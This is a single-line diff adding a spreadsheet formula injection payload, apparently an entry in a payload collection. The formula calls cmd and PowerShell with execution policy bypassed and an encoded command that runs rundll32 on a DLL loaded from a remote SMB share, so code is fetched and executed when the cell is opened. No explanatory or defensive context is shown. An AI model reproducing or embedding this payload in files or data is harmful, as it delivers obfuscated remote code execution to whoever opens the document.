@@ -1,0 +1,1 @@
+=cmd|'/c powershell.exe -ExecutionPolicy Bypass -enc cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABcAFwAMQAwAC4AMAAuADIALgAxADUAXAAzAFwAMgBcADEALgBkAGwAbAAsADAA'!_xlbgnm.A1
